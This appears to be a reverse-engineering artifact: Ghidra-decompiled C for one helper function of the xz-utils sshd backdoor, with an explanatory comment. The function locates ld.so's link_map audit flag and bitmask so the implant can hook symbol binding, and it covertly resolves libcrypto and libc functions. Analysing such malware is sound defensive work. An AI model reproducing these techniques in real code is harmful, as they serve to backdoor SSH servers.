// /home/kali/xzre-ghidra/xzregh/104AE0_find_link_map_l_audit_any_plt_bitmask.c
// Function: find_link_map_l_audit_any_plt_bitmask @ 0x104AE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_link_map_l_audit_any_plt_bitmask(backdoor_data_handle_t * data, instruction_search_ctx_t * search_ctx)


/*
 * AutoDoc: Takes the displacement from `find_link_map_l_name` and hunts for the byte and mask that back ld.so’s `link_map::l_audit_any_plt` flag. It temporarily resolves `EVP_DecryptInit_ex` and libc’s `getuid`, decodes `_dl_audit_symbind_alt` with `x86_dasm`, and tracks which register holds the computed pointer. Once it sees the MOV-from-link_map followed by a TEST/BT it validates that the mask is a single set bit, records the absolute address in `hooks->ldso_ctx.sshd_link_map_l_audit_any_plt_addr`, stores the byte-wide mask, and insists the bit is still clear; otherwise the helper sets the search context’s `result` flag and bails out.
 */

#include "xzre_types.h"

BOOL find_link_map_l_audit_any_plt_bitmask
               (backdoor_data_handle_t *data,instruction_search_ctx_t *search_ctx)

{
  imported_funcs_t *piVar1;
  libc_imports_t *plVar2;
  u32 *puVar3;
  backdoor_hooks_data_t *pbVar4;
  undefined1 uVar5;
  BOOL BVar6;
  u32 uVar7;
  lzma_allocator *allocator;
  pfn_EVP_DecryptInit_ex_t ppVar8;
  lzma_allocator *allocator_00;
  pfn_getuid_t ppVar9;
  link_map *plVar10;
  undefined1 uVar11;
  byte bVar12;
  long lVar13;
  u8 *puVar14;
  dasm_ctx_t *pdVar15;
  int iVar16;
  u8 *code_start;
  byte bVar17;
  dasm_ctx_t local_80;
  
  bVar17 = 0;
  BVar6 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x97,0x1f,9);
  if (BVar6 != FALSE) {
    code_start = search_ctx->start_addr;
    pdVar15 = &local_80;
    for (lVar13 = 0x16; lVar13 != 0; lVar13 = lVar13 + -1) {
      *(undefined4 *)&pdVar15->instruction = 0;
      pdVar15 = (dasm_ctx_t *)((long)pdVar15 + (ulong)bVar17 * -8 + 4);
    }
    allocator = get_lzma_allocator();
    allocator->opaque = data->elf_handles->libcrypto;
    ppVar8 = (pfn_EVP_DecryptInit_ex_t)lzma_alloc(0xc08,allocator);
    piVar1 = search_ctx->imported_funcs;
    piVar1->EVP_DecryptInit_ex = ppVar8;
    if (ppVar8 != (pfn_EVP_DecryptInit_ex_t)0x0) {
      piVar1->resolved_imports_count = piVar1->resolved_imports_count + 1;
    }
    plVar2 = piVar1->libc;
    allocator_00 = get_lzma_allocator();
    allocator_00->opaque = data->elf_handles->libc;
    ppVar9 = (pfn_getuid_t)lzma_alloc(0x348,allocator_00);
    plVar2->getuid = ppVar9;
    if (ppVar9 != (pfn_getuid_t)0x0) {
      plVar2->resolved_imports_count = plVar2->resolved_imports_count + 1;
    }
    iVar16 = 0;
    bVar17 = 0xff;
    for (; code_start < search_ctx->end_addr; code_start = code_start + local_80.instruction_size) {
      BVar6 = x86_dasm(&local_80,code_start,search_ctx->end_addr);
      if (BVar6 == FALSE) {
        return FALSE;
      }
      if (iVar16 == 0) {
        if (((local_80._40_4_ == 0x1036) && (((ushort)local_80.prefix._0_4_ & 0x140) == 0x140)) &&
           ((byte)(local_80.prefix._13_1_ - 1) < 2)) {
          uVar11 = 0;
          if ((local_80.prefix._0_4_ & 0x40) == 0) {
            uVar5 = 0;
            if (((local_80.prefix._0_4_ & 0x1040) != 0) &&
               (uVar5 = local_80.prefix.decoded.flags2 & 0x10, (local_80.prefix._0_4_ & 0x1000) != 0
               )) {
              if ((local_80.prefix._0_4_ & 0x20) == 0) {
                uVar11 = 0;
                uVar5 = local_80.imm64_reg;
              }
              else {
                uVar5 = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
              }
            }
          }
          else {
            uVar5 = local_80.prefix.decoded.flags & 0x20;
            if ((local_80.prefix._0_4_ & 0x20) == 0) {
              uVar11 = local_80.prefix._15_1_;
              if ((local_80.prefix._0_4_ & 0x1040) != 0) {
                uVar5 = local_80.prefix._14_1_;
              }
            }
            else {
              uVar11 = local_80.prefix._15_1_ | (char)local_80.prefix.decoded.rex * '\b' & 8U;
              uVar5 = 0;
              if ((local_80.prefix._0_4_ & 0x1040) != 0) {
                uVar5 = local_80.prefix._14_1_ | (char)local_80.prefix.decoded.rex * '\x02' & 8U;
              }
            }
          }
          puVar14 = (u8 *)0x0;
          if (((local_80.prefix._0_4_ & 0x100) != 0) &&
             (puVar14 = (u8 *)local_80.mem_disp,
             ((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000)) {
            puVar14 = local_80.instruction + (long)(local_80.mem_disp + local_80.instruction_size);
          }
          if (((u8 *)(ulong)*(uint *)&search_ctx->offset_to_match == puVar14) &&
             (((int)(uint)*(ushort *)search_ctx->output_register >> (uVar11 & 0x1f) & 1U) != 0)) {
            *(undefined1 *)((long)search_ctx->output_register + 2) = uVar5;
            iVar16 = 1;
          }
        }
      }
      else if (iVar16 == 1) {
        if ((local_80._40_4_ & 0xfffffffd) == 0x89) {
          puVar3 = search_ctx->output_register_to_match;
          uVar11 = local_80.prefix.decoded.flags & 0x40;
          if ((local_80.prefix._0_4_ & 0x1040) == 0) {
            uVar5 = 0;
            if ((local_80.prefix._0_4_ & 0x40) != 0) goto LAB_00104d83;
            if (*(char *)((long)puVar3 + 2) != '\0') goto LAB_00104e97;
            bVar12 = 0;
LAB_00104da0:
            if (search_ctx->output_register[2] != uVar11) goto LAB_00104da9;
          }
          else {
            if ((local_80.prefix._0_4_ & 0x40) == 0) {
              if ((local_80.prefix._0_4_ & 0x1000) == 0) {
                if (*(char *)((long)puVar3 + 2) == '\0') {
                  uVar5 = 0;
                  bVar12 = 0;
                  goto LAB_00104da0;
                }
                goto LAB_00104e97;
              }
              uVar5 = local_80.imm64_reg;
              if ((local_80.prefix._0_4_ & 0x20) != 0) {
                uVar5 = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
              }
            }
            else {
              uVar5 = local_80.prefix._14_1_;
              if ((local_80.prefix._0_4_ & 0x20) != 0) {
                uVar5 = local_80.prefix._14_1_ | (char)local_80.prefix.decoded.rex * '\x02' & 8U;
              }
LAB_00104d83:
              uVar11 = local_80.prefix._15_1_;
              if ((local_80.prefix._0_4_ & 0x20) != 0) {
                uVar11 = local_80.prefix._15_1_ | ((byte)local_80.prefix.decoded.rex & 1) << 3;
              }
            }
            bVar12 = *(byte *)((long)puVar3 + 2);
            if (bVar12 == uVar5) goto LAB_00104da0;
LAB_00104da9:
            if ((uVar11 != bVar12) || (search_ctx->output_register[2] != uVar5)) goto LAB_00104e97;
          }
          iVar16 = 2;
          bVar17 = uVar11;
          if (local_80._40_4_ != 0x89) {
            bVar17 = uVar5;
          }
        }
      }
      else if (iVar16 == 2) {
        if (local_80._40_4_ == 0x128) {
          bVar12 = 0;
        }
        else {
          if ((local_80._40_4_ != 0x176) || (local_80.prefix._14_1_ != 0)) goto LAB_00104e97;
          bVar12 = 0;
          if ((local_80.prefix._0_4_ & 0x1040) != 0) {
            if ((local_80.prefix._0_4_ & 0x40) == 0) {
              bVar12 = local_80.prefix.decoded.flags2 & 0x10;
              if (((local_80.prefix._0_4_ & 0x1000) != 0) &&
                 (bVar12 = local_80.imm64_reg, (local_80.prefix._0_4_ & 0x20) != 0)) {
                bVar12 = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
              }
            }
            else {
              bVar12 = local_80.prefix.decoded.flags & 0x20;
              if ((local_80.prefix._0_4_ & 0x20) != 0) {
                bVar12 = (char)local_80.prefix.decoded.rex * '\x02' & 8;
              }
            }
          }
        }
        if (bVar17 == bVar12) {
          if ((local_80.operand_zeroextended < 0x100) &&
             (uVar7 = count_bits(local_80.operand_zeroextended), uVar7 == 1)) {
            pbVar4 = search_ctx->hooks;
            plVar10 = data->data->main_map + *(uint *)&search_ctx->offset_to_match;
            (pbVar4->ldso_ctx).sshd_link_map_l_audit_any_plt_addr = plVar10;
            (pbVar4->ldso_ctx).link_map_l_audit_any_plt_bitmask = (u8)local_80.operand_zeroextended;
            if ((plVar10->_opaque & local_80.operand_zeroextended) == 0) {
              return TRUE;
            }
          }
          search_ctx->result = TRUE;
          return FALSE;
        }
      }
LAB_00104e97:
    }
    allocator->opaque = data->elf_handles->libcrypto;
    lzma_free(search_ctx->imported_funcs->EVP_DecryptInit_ex,allocator);
    lzma_free(plVar2->getuid,allocator_00);
  }
  return FALSE;
}

